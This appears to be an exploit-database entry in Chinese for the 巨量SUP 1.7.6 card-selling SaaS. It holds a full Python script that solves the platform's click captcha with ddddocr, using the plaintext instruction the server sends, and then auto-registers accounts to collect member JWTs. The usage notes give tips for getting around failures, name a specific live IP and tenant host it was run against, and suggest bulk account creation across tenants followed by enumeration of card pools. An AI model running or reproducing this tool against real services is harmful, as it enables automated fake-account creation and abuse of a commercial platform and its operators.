# 巨量SUP 1.7.6 点选验证码明文 instruction 可 ddddocr 1/1 求解 + 开放注册全自动造号拿 member JWT

- **code**: juliang-sup-click-captcha-ocr-auto-register-member-jwt
- **kind**: exp
- **category**: auth-bypass
- **component**: 巨量SUP（多租户发卡/卡商 SaaS 1.7.6，/api/captcha?mode=click + /api/captcha/verify + /api/register，Host 绑定租户）
- **versions**: 1.7.6
- **severity**: low
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: task#616 / finding 1288，2026-11-06 10:02 +08 在本机（Windows, python313 + 内置 ddddocr）对 https://45.207.198.244（Host: www.dyy077.top，-k/verify=False、--noproxy）实测：① GET /api/captcha?mode=click&t=1793 → 200，data.captcha_instruction="用、明"、captcha_id=Ye_LFl48X0oxy939mTPInIwVtgKiTLVa、captcha_img 为 320x160 base64 PNG；② ddddocr detection 得 8 框、识别后按 instruction 顺序取「用」(104,82)、「明」(299,37)，POST /api/captcha/verify → 200 data.captcha_token（一次性）；③ 携 token POST /api/register {"username":"artexa53dip,...} → 200 {"code":0,"data":{"message":"注册成功","token":"eyJhbGci..."},"user":{"id":1178}}（GPT 三项齐全）；④ Bearer 该 JWT GET /api/goods?page=1&size=100 → 200 total=676（30 页 310 条 is_card_code 全=2），GET /api/member/info → 200 balance=0。判定成立依据：OCR 坐标直接被 verify 接受换来 token、token 直接被 register 接受并签发 member JWT、该 JWT 能读全部登录态业务接口。
- **path**: pocs/juliang-sup-click-captcha-ocr-auto-register-member-jwt/juliangsup_captcha_register.py
- **tags**: 巨量sup,多租户,发卡,礼品卡,captcha,点选验证码,ddddocr,ocr,开放注册,自动造号,member-jwt,auth-bypass,1.7.6
- **created_at**: 2026-11-06T02:15:13.750Z
- **engine**: https://45.207.198.244（Host: www.dyy077.top）

## 描述

巨量SUP 的注册人机验证是 /api/captcha?mode=click 两点选码，且把要点的字符以明文 captcha_instruction（如「用、明」）直接在响应里下发；图片 320x160 无变形无干扰，ddddocr detection+classification 可稳定定位并按 instruction 顺序提交，POST /api/captcha/verify 直接给一次性 captcha_token。注册接口 /api/register 不要求邮箱、无 IP 限额，token 填入 captcha_code 即注册成功并下发 member JWT。等于验证码闸门可被本地 OCR 完全自动化，批量造号唯一成本是 OCR 算力。适合做“拿低权账号 → 枚举业务接口/卡池筛选”的前置铺垫。

## 用法

```
前置：① 目标 HTTPS 可达，必须用该实例已绑定的租户 Host（未绑定的 Host 回 "Domain is not available"）；② 证书多半自签 → verify=False；③ 所有请求带 Host 与 Origin=https://<VHOST>；④ pip install requests ddddocr pillow，本机 ddddocr 自带检测/识别模型，不需要训练。\n\npython juliangsup_captcha_register.py https://TARGET_IP www.TENANT.TLD [username]\n\n脚本流程：GET /api/captcha?mode=click&t=<ts> → 取 captcha_id/instruction/base64 图 → ddddocr det 出框、clf 识别字形 → 按 instruction 字符顺序取各字符框中心 → POST /api/captcha/verify {"captcha_id","clicks":[{x,y},...]} 换 captcha_token → POST /api/register {"username","password","email":"","qq":"","invite_code":"","captcha_id","captcha_code":token} 拿 member JWT → Bearer 校验 GET /api/member/info 与 GET /api/goods。\n\n判据：verify 返回 code:0 且 data.captcha_token 非空；register 返回 code:0 且 data.token 是 JWT、data.user.id 有值；带该 JWT 访问 /api/goods 200（不带则 401「请先登录」）。\n\n常见失败原因：① Host 不匹配 → Domain is not available；② 走了本机代理（requests 要 trust_env=False）；③ captcha_id 与 token 一次性，重试必须重新取整组验证码，不能复用；④ instruction 里的分隔符（、/，/空格）要过滤掉，字符顺序不能按识别框坐标排；⑤ 某字符识别失败就直接换一张图重试，别把错误坐标提交（失败会烧掉该 captcha_id）。\n\n延伸：拿到 JWT 后即可做卡池筛字段（/api/goods 的 is_card_code、is_close、price），或换租户 Host 批量铺开。同产品的未授权配置读取见条目 juliang-sup-api-settings-captcha-unauth-tenant-host（/api/settings 可先确认 register_enabled=1）。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
巨量SUP 1.7.6 —— 点选验证码 OCR 自动求解 + 开放注册造号（拿 member JWT）

用法:
    python juliangsup_captcha_register.py https://45.207.198.244 www.dyy077.top [username]

前置:
    1) 必须用该实例已绑定的租户 Host（未绑定 -> "Domain is not available"）
    2) 证书自签，verify=False；trust_env=False 避免本机代理污染
    3) pip install requests ddddocr pillow

流程:
    GET /api/captcha?mode=click  -> captcha_id + captcha_instruction + base64 图
    ddddocr(det) 出框 -> ddddocr(clf) 识别每个框 -> 按 instruction 字符顺序取框中心
    POST /api/captcha/verify {"captcha_id","clicks":[...]} -> captcha_token
    POST /api/register {... "captcha_code": token} -> member JWT
    Bearer 校验 /api/member/info、/api/goods
"""
import base64
import io
import json
import random
import string
import sys
import time

import requests
import ddddocr
from PIL import Image

if len(sys.argv) < 3:
    print(__doc__)
    sys.exit(1)

BASE = sys.argv[1].rstrip("/")
VHOST = sys.argv[2]
USERNAME = sys.argv[3] if len(sys.argv) > 3 else "artex" + "".join(
    random.choices(string.ascii_lowercase + string.digits, k=6)
)
PASSWORD = "Passw0rd2026!"

HEADERS = {
    "Host": VHOST,
    "Origin": "https://" + VHOST,
    "Referer": "https://" + VHOST + "/",
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"),
  "Accept": "application/json, text/plain, */*",
}

s = requests.Session()
s.trust_env = False   # 关键：不走本机代理
s.verify = False      # 自签证书


def grab_captcha():
    """取一条点选验证码（captcha_id 与 token 均一次性，重试必须整条重取）"""
    r = s.get(
        BASE + "/api/captcha",
        params={"mode": "click", "t": int(time.time() * 1000)},
        headers=HEADERS,
        timeout=10,
    )
    r.raise_for_status()
    data = r.json()["data"]
    return data["captcha_id"], data["captcha_instruction"], data["captcha_img"]


def solve_click(instruction, data_url):
    """按 instruction 字形顺序返回点击坐标；识别不全返回 None"""
    raw = base64.b64decode(data_url.split(",", 1)[1])
    img = Image.open(io.BytesIO(raw)).convert("RGB")

    det = ddddocr.DdddOcr(det=True, show_ad=False)
    clf = ddddocr.DdddOcr(show_ad=False)

    boxes = det.detection(raw)          # [[x1,y1,x2,y2], ...]
    cands = []
    for b in boxes:
        x1, y1, x2, y2 = b
        crop = img.crop((x1, y1, x2, y2))
        buf = io.BytesIO()
        crop.save(buf, format="PNG")
        txt = clf.classification(buf.getvalue())
        cands.append((txt, (x1 + x2) // 2, (y1 + y2) // 2))

    chars = [c for c in instruction if c not in "、,， 　"]
    clicks = []
    for ch in chars:                    # 严格按 instruction 顺序，不按坐标排序
        hit = None
        for i, (txt, x, y) in enumerate(cands):
            if txt == ch:
                hit = (x, y)
                cands.pop(i)
                break
        if hit is None:
            return None                 # 有字符没识别出来 -> 换图重试
        clicks.append({"x": hit[0], "y": hit[1]})
    return clicks


def main():
    for attempt in range(1, 8):
        cid, instruction, img = grab_captcha()
        clicks = solve_click(instruction, img)
        if not clicks:
            print("[*] 第 %d 次：识别不全 (%r)，换图" % (attempt, instruction))
            continue

        r = s.post(
            BASE + "/api/captcha/verify",
            headers=HEADERS,
            json={"captcha_id": cid, "clicks": clicks},
            timeout=10,
        )
        j = r.json()
        token = (j.get("data") or {}).get("captcha_token")
        print("[*] verify %s instruction=%r clicks=%s -> %s"
              % (r.status_code, instruction, clicks, j.get("msg")))
        if not token:
            continue                # captcha_id 已被烧掉，重取

        r = s.post(
            BASE + "/api/register",
            headers=HEADERS,
            json={
                "username": USERNAME,
                "password": PASSWORD,
                "email": "",
                "qq": "",
                "invite_code": "",
                "captcha_id": cid,
                "captcha_code": token,
            },
            timeout=10,
        )
        j = r.json()
        print("[*] register %s %s" % (r.status_code, json.dumps(j, ensure_ascii=False)[:300]))
        if j.get("code") != 0:
            continue

        jwt = j["data"]["token"]
        h = dict(HEADERS)
        h["Authorization"] = "Bearer " + jwt

        me = s.get(BASE + "/api/member/info", headers=h, timeout=10)
        goods = s.get(BASE + "/api/goods", params={"page": 1, "size": 100},
                      headers=h, timeout=10)
        print("[+] member/info %s %s" % (me.status_code, me.text[:160]))
        print("[+] goods %s %s" % (goods.status_code, goods.text[:200]))
        print("[+] username=%s password=%s" % (USERNAME, PASSWORD))
        print("[+] JWT=%s" % jwt)
        return

    print("[-] 7 次均失败，检查 Host / 代理 / ddddocr 模型")


if __name__ == "__main__":
    main()

```
